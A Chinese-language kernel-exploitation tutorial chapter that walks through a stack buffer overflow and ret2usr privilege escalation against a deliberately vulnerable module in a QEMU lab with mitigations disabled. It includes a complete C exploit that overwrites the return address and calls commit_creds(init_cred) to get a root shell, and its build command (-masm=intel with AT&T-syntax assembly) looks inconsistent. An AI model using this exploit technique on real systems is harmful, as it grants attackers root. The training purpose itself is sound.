# Ch 4 — Stack Buffer Overflow in kernel：canary 與第一次 ret2usr

> 目標：在 kernel stack 上溢位、**精確控制** return address、跳到我們 user-space 準備好的 shellcode 拿 root。這是 ret2usr — 最原始、最乾淨的 kernel exploit 模型。做完這章你應該能解釋 kernel stack 長怎樣、canary 如何被打敗、commit_creds/prepare_kernel_cred 為什麼是提權 magic。

## 戰略：用最低 mitigation 起步

Ch 2 那個 module 觸發的是 `stack-protector panic`，因為 `CONFIG_STACKPROTECTOR=y`。這章前半我們**關掉** canary 讓概念純粹；後半再打開、解 canary leak。這是學 kernel pwn 的正確順序 — 一次開一層 mitigation。

## Step 0 — 編一個「裸奔」kernel

留著 Ch 0-3 的 `linux-6.6.60` 當主樹，另外複製一份：

```bash
cp -r ~/kpwn/kernel/linux-6.6.60 ~/kpwn/kernel/linux-6.6.60-weak
cd ~/kpwn/kernel/linux-6.6.60-weak

./scripts/config --disable STACKPROTECTOR
./scripts/config --disable STACKPROTECTOR_STRONG
./scripts/config --disable RANDOMIZE_BASE      # 關 KASLR（Ch 6 再開）
./scripts/config --disable RETPOLINE           # 砍 indirect branch 保護，方便 ROP
# SMEP / SMAP 由 QEMU -cpu 控，不用動 kernel config

make -j$(nproc) bzImage
```

再寫一份 `run-weak.sh`：

```bash
cat > ~/kpwn/scripts/run-weak.sh <<'EOF'
#!/bin/bash
cd ~/kpwn
qemu-system-x86_64 \
    -kernel kernel/linux-6.6.60-weak/arch/x86/boot/bzImage \
    -initrd initramfs.cpio.gz \
    -append "console=ttyS0 nokaslr nopti quiet panic=1 oops=panic" \
    -m 512M \
    -cpu qemu64,+smep,+smap \
    -smp 1 \
    -monitor none -no-reboot -nographic -s
EOF
chmod +x ~/kpwn/scripts/run-weak.sh
```

`nopti` 把 KPTI 也關了，ret2usr 才順 — Ch 7 才讓它回來。

## Step 1 — kernel stack 長怎樣

進 kernel 後，每個 task 有自己的 kernel stack（預設 16 KB，`THREAD_SIZE`）。syscall 入口 `entry_SYSCALL_64` 會把 rsp 切到這塊 stack 頂，然後 push `pt_regs`、call C handler。

你 ioctl 進 `vuln_ioctl` 時 stack 長這樣（**沒有 canary 的版本**）：

```
low  ┌───────────────────┐  ← rsp 當前
     │ local[0..63]      │  (64 bytes)
     │                   │
     │ saved rbp         │  8 bytes
     │ return addr       │  ← 我們要控這個
     │ （caller 的 frame）│
high └───────────────────┘
```

`copy_from_user(local, uarg, 128)` 會從 `local` 開始線性往上寫 128 bytes。64 bytes 後就踩進 saved rbp、再 8 bytes 踩進 return address。

## Step 2 — 算準 offset

把 Ch 2 的 `vuln.ko` 載到**這個 weak kernel** 跑一次 crash：

```
/ # insmod /vuln.ko
/ # /home/user/trigger   # Ch 2 的，payload 全 0x41
[   xx.xxx] general protection fault, probably for non-canonical address 0x4141414141414141
[   xx.xxx] CPU: 0 PID: ... Comm: trigger
[   xx.xxx] RIP: 0010:0x4141414141414141
```

看到 `RIP: 0x4141414141414141` 就是你拿下 RIP 了。這個 payload 全 `'A'`，不知道哪幾個 byte 剛好落在 return address。

**找 offset 的快速方法**：用 De Bruijn / cyclic pattern。

改 trigger：

```c
char pattern[128];
for (int i = 0; i < 128; i++) pattern[i] = 'a' + (i % 26);
ioctl(fd, VULN_ECHO, pattern);
```

crash log 看 RIP 是什麼 8 byte 序列，回算 offset。比較暴力但直接的方法：payload 前 72 byte 填 `'A'`（64 local + 8 rbp），接下來 8 byte 填 `'B' * 8 = 0x4242...`。看 RIP 是不是 `0x4242424242424242`。若是，offset = 72。

以我們這個 module，offset 就是 **72**。

## Step 3 — ret2usr 基本原理

沒開 SMEP 的世界裡，kernel ring 0 執行 user 地址上的指令是**合法的**。所以：

1. 在 user-space 準備好一段 shellcode（C function 也行）
2. overflow 把 return address 蓋成該 function 的地址
3. kernel 返回時跳過去，還在 ring 0 執行我們的 code
4. code 裡呼叫 `commit_creds(prepare_kernel_cred(NULL))` → 把當前 task 的 cred 換成 root
5. 安全地回 user-space — fork 或 `execve("/bin/sh")`

但我們 Ch 0 的 `run-weak.sh` 已經有 `-cpu ...,+smep,+smap`。先**關 SMEP** 才能做乾淨的 ret2usr：

把 `run-weak.sh` 的 `-cpu qemu64,+smep,+smap` 改成 `-cpu qemu64`，重開 guest。

確認：

```
/ # grep flags /proc/cpuinfo | head -1 | tr ' ' '\n' | grep -E 'smep|smap'
（應該什麼都不印 — SMEP/SMAP 都沒開）
```

## Step 4 — 提權函式的地址

`commit_creds` 與 `prepare_kernel_cred` 在 kernel text 裡，地址從 `/proc/kallsyms` 抓。

```
/ # grep -E " (commit_creds|prepare_kernel_cred)$" /proc/kallsyms
ffffffff810c4b30 T commit_creds
ffffffff810c4f00 T prepare_kernel_cred
```

**`nokaslr` 下這兩個地址每次都一樣**。實務上 exploit 開頭會先 `popen("cat /proc/kallsyms | grep ...")` 讀出來、或由 host 先抓好 hardcode 進去。

**6.2 之後 `prepare_kernel_cred(0)` 會被拒絕**（patch: `prepare_kernel_cred` 禁收 NULL）。改法：

- 走 `prepare_kernel_cred(&init_task)` — 傳 init_task 地址
- 或直接改 `current->cred` 欄位（`current` 從 `gs:current_task` 拿）
- 或 `commit_creds(init_cred)`（init_cred 是現成的 root cred）

我們選第三條最乾淨。`init_cred` 也從 kallsyms 拿：

```
/ # grep " init_cred$" /proc/kallsyms
ffffffff82e3c3e0 D init_cred
```

## Step 5 — 寫 exploit

`~/kpwn/exploit/ch04/exp.c`：

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define VULN_ECHO _IOW('v', 1, char[128])

/* 從 /proc/kallsyms 抓出的地址，nokaslr 下固定 */
#define COMMIT_CREDS  0xffffffff810c4b30UL
#define INIT_CRED     0xffffffff82e3c3e0UL

typedef void (*commit_creds_t)(void *cred);

static void save_state(unsigned long *cs, unsigned long *ss, unsigned long *rflags, unsigned long *sp) {
    asm volatile(
        "mov %%cs, %0\n"
        "mov %%ss, %1\n"
        "pushfq\n"
        "pop %2\n"
        "mov %%rsp, %3\n"
        : "=r"(*cs), "=r"(*ss), "=r"(*rflags), "=r"(*sp));
}

static unsigned long saved_cs, saved_ss, saved_rflags, saved_sp;

static void shell(void) {
    system("/bin/sh");
    exit(0);
}

/* ret2usr payload：在 kernel 跑這個 function */
__attribute__((naked))
static void kernel_payload(void) {
    asm volatile(
        "movabs $0xffffffff810c4b30, %%rax\n"   /* commit_creds */
        "movabs $0xffffffff82e3c3e0, %%rdi\n"   /* init_cred */
        "call *%%rax\n"
        /* 回 user-space：iretq 帶 5-word stack frame */
        "swapgs\n"
        "movabs $shell, %%rcx\n"
        "pushq %[ss]\n"
        "pushq %[sp]\n"
        "pushq %[rflags]\n"
        "pushq %[cs]\n"
        "pushq %%rcx\n"
        "iretq\n"
        : : [ss]"m"(saved_ss), [sp]"m"(saved_sp),
            [rflags]"m"(saved_rflags), [cs]"m"(saved_cs)
        : "rax", "rdi", "rcx");
}

int main(void) {
    save_state(&saved_cs, &saved_ss, &saved_rflags, &saved_sp);

    int fd = open("/dev/vuln", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    char payload[128];
    memset(payload, 'A', 72);
    *(unsigned long *)&payload[72] = (unsigned long)kernel_payload;
    /* 後面補齊到 128 byte，不重要 */
    memset(payload + 80, 'C', 48);

    printf("triggering overflow, return to %p\n", kernel_payload);
    ioctl(fd, VULN_ECHO, payload);
    /* iretq 會把我們送回 shell()，這行正常不會執行 */
    return 0;
}
```

編、裝、跑：

```bash
gcc -static -O0 -masm=intel -o ~/kpwn/exploit/ch04/exp ~/kpwn/exploit/ch04/exp.c
cp ~/kpwn/exploit/ch04/exp ~/kpwn/initramfs/home/user/
~/kpwn/scripts/make-initramfs.sh
~/kpwn/scripts/run-weak.sh

# guest 裡
/ # insmod /vuln.ko
/ # id
uid=1000(user) gid=1000(user)
/ # /home/user/exp
triggering overflow, return to 0x401234
/ # id
uid=0(root) gid=0(root)
```

如果 id 從 `1000` 變 `0` — 你剛拿下 kernel ring。這是整門課的第一個 root shell。

### 為什麼要 `save_state` + `iretq`

ret2usr 結束要乾淨回到 user-space。你不能 `ret`（stack 被你搞爛了）、不能隨便 `jmp` 回 user（還在 ring 0）。**`iretq` 是 CPU 原生的 ring 切換指令**，它從 stack pop 五個 word：

```
iretq pops:
    rip      ← 我們塞 shell 地址
    cs       ← 原本 user cs
    rflags   ← 原本 user rflags
    rsp      ← 原本 user rsp
    ss       ← 原本 user ss
```

pop 完 CPU 自動降 ring、跳回 user rip 執行。`swapgs` 在 iretq 前做，把 gs 切回 user 版本（Ch 1 講過）。

## Step 6 — 把 canary 開回來

改 weak kernel 的 config：

```bash
cd ~/kpwn/kernel/linux-6.6.60-weak
./scripts/config --enable STACKPROTECTOR
./scripts/config --enable STACKPROTECTOR_STRONG
make -j$(nproc) bzImage
```

重啟 guest，再跑 `exp`：現在會直接 `Kernel stack is corrupted in: vuln_ioctl` 然後 panic。

為什麼？gcc 在 `vuln_ioctl` 入口 push canary 到 stack、出口 check：

```
vuln_ioctl:
    sub rsp, 80
    mov rax, %gs:0x28       ; 讀 per-CPU canary
    mov [rsp+72], rax       ; 存 canary
    ...                     ; 函式本體
    mov rax, [rsp+72]
    xor rax, %gs:0x28
    jne __stack_chk_fail    ; 不對就 panic
    add rsp, 80
    ret
```

你的 overflow 覆蓋的順序：

```
[rsp+0..63]   local[64]     ← 可控
[rsp+64..71]  canary        ← 被覆寫，不 leak 就是 panic
[rsp+72..79]  saved rbp
[rsp+80..87]  return addr
```

**要活過 canary check 只有兩條路**：

1. **Leak canary**：用另一個 info leak primitive（通常是 `copy_to_user` 讀 uninit 或讀相鄰 object）讀出當前 task 的 canary，然後 overflow payload 寫回正確 canary。
2. **跳過 canary check**：如果 overflow 能控得更細、只覆寫 return addr 上面的東西，可以不動 canary。但 stack overflow 通常是線性拷貝，這條不適用。

CTF 常見套路：同一個 module 另有個「讀 N byte」的 ioctl，size 沒檢查，從 `local` 開始讀 > 64 byte 就把 canary 讀出來。然後 overflow 前先 leak、組好 payload、再打。

本章不寫第二版 module（留給練習 A）。概念內化是重點。

## Step 7 — 你剛剛踩過的 mitigation 地圖

```
SMEP 關 + SMAP 關 + canary 關 + KASLR 關 + KPTI 關
    │
    │   Ch 4 前半：寫你看到的 exploit
    ▼
canary 開 → 需要 leak canary
    │
    │   Ch 4 後半
    ▼
SMEP 開 → ret2usr 失效，改 kROP          ← Ch 5
    │
    ▼
SMAP 開 → ROP 裡不能 mov user ptr         ← Ch 5
    │
    ▼
KASLR 開 → kernel text 地址不固定        ← Ch 6
    │
    ▼
KPTI 開 → sysret / iretq 回 user 會炸    ← Ch 7
```

每開一層就逼你多一招。真實 kernelCTF 的 LTS 賽道**全部都開**。

## 常見踩雷

**`exp` 跑完 guest 整個 panic** — canary 開著你沒 leak、或 ret2usr 跳去的 function 不是 naked（ABI 不符，gcc 加了 prologue 踩 stack）。

**id 還是 `uid=1000`** — `commit_creds` 地址抓錯、或 `init_cred` 在你的 kernel 上叫別的名字。`grep -E " init_cred| init_task$" /proc/kallsyms` 確認。

**`Unable to handle kernel paging request at 0x401234`** — SMEP 沒關。你的 kernel_payload 地址是 user 的（user page），ring 0 執行它觸發 SMEP #PF。改 `-cpu` 或 Ch 5 走 ROP。

**`shell()` 沒跑到，反而卡住或 segfault** — iretq 的 5-word frame 順序錯了。**由底到頂依序**是 `rip, cs, rflags, rsp, ss`，push 反過來。

**SMAP 開著但沒進 ret2usr 直接掛** — overflow 本身在 `copy_from_user` 階段炸了。SMAP 不影響 `copy_from_user`（它內部會 `stac`），但影響後續 kernel 讀 user 指標。`iretq` 的 5 個 push 操作在 kernel stack 上，不走 user memory，不受 SMAP 影響。

## 動手練習

1. **把 offset 從 72 驗過一次** — 用 cyclic pattern 不要用拍腦袋。養成習慣，後面 heap 題 offset 動輒 0x200。
2. **關閉 `nokaslr` 讓 KASLR 開**，觀察你 hardcode 的地址不再 work（offset 每次不一樣）。Ch 6 處理。
3. **重 build kernel 打開 canary + SMEP**，自己設計 leak primitive：可以在 vuln module 多加一個 ioctl `VULN_PEEK2`，回讀 `local[64..128]`。用它 leak 出 canary。
4. **算一下你 stack frame 的實際大小**：gdb 連進去、`b vuln_ioctl`、看 prologue `sub rsp, ?`，比對你的 offset 對不對。
5. **讀 `arch/x86/entry/entry_64.S` 的 `error_entry` / `error_exit`** — 真正 robust 的 iretq path 比你這個手寫版精細得多。

## 自我檢核

- [ ] 能說出 ret2usr 在哪一步需要哪一個 mitigation 關掉（SMEP、canary、KPTI）
- [ ] 能默寫 `iretq` 的 5-word stack frame 順序
- [ ] 知道 `commit_creds(init_cred)` 等於提權到 root
- [ ] 能從 `/proc/kallsyms` 查到 `commit_creds` / `init_cred` / `init_task` 地址
- [ ] 理解為什麼 6.2 後 `prepare_kernel_cred(0)` 不再 work
- [ ] 能描述 stack canary 在 prologue / epilogue 的位置，為什麼 overflow 會打爆它

下一章 SMEP / SMAP 正式打開，你會看到 ret2usr 這條路被整個封死，只好轉向 kernel ROP — 用 kernel 自己的 gadget 拼出提權序列。

→ [Ch 5 — SMEP / SMAP：commit_creds + prepare_kernel_cred ROP](./05-smep-smap.md)
